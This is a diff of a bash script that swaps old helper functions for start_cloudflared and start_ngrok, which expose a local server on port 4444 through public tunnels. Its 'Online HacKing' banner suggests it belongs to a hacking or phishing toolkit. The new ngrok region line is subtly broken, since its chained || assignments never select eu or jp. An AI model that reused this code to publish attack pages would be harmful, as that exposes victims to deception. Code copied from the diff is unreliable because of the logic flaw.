@@ -57,7 +57,7 @@ echo ""
 read -p $'\e[1;32m\e[94m Please enter your Option (A/B/C) : ' portfrd
 if [[ $portfrd == "A" || $portfrd == "a" || $portfrd == "cloudflare" ]]; then
 echo ""
-link_server
+start_cloudflared
 l_logo
                            echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                            echo -e " "
@@ -84,7 +84,7 @@ if [[ $portfrd == "B" || $portfrd == "b" || $portfrd == "ngrok" ]]; then
 echo ""
 clear
 ngroktoken
-link_server2
+start_ngrok
 l_logo
                            echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                            echo -e " "
@@ -236,33 +236,43 @@ echo ""
 }
 
 
-link_server() {
-echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
-rm -rf cld.log
-			   echo -ne "  "
-   		           if [[ `command -v termux-chroot` ]]; then
-			  sleep 2 && termux-chroot cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
-   			  else
-     		           sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
-   	                 fi
-			{ sleep 8; clear; }
-				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
-			   echo ""
-		 }	   
+start_cloudflared() { 
+	rm cld.log > /dev/null 2>&1 &
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; }
+	echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./cloudflared tunnel -url "127.0.0.1":"4444" --logfile cld.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./cloudflared tunnel -url "127.0.0.1":"4444" --logfile cld.log > /dev/null 2>&1 &
+	fi
+
+	sleep 8
+	clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+
+	
+}	   
 
 
-link_server2() {
-            echo ""       echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok...\e[0m  "
-			   echo -e $" \e[91m[\e[0m Online HacKing\e[91m]\e[1;92m Wait For Start.....\e[0m  "
-			   echo -ne ""
-                           if [[ `command -v termux-chroot` ]]; then
-                           sleep 1 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 & 
-                          else
-                            sleep 1 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
-                         fi
-	                 { sleep 8; clear; }
-	                       nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-			       echo ""
+start_ngrok() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
+	{ sleep 1; }
+	echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok...\e[0m  "
+	echo -e "\n"
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? Typr Y ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && ngrok_region="in" || ngrok_region="us" || ngrok_region="eu" || ngrok_region="jp"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./ngrok http --region ${ngrok_region} "127.0.0.1":"4444" > /dev/null 2>&1 &
+	else
+		sleep 2 && ./ngrok http --region ${ngrok_region} "127.0.0.1":"4444" > /dev/null 2>&1 &
+	fi
+
+	sleep 8
+	nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+
 }
 
 logo_last() {
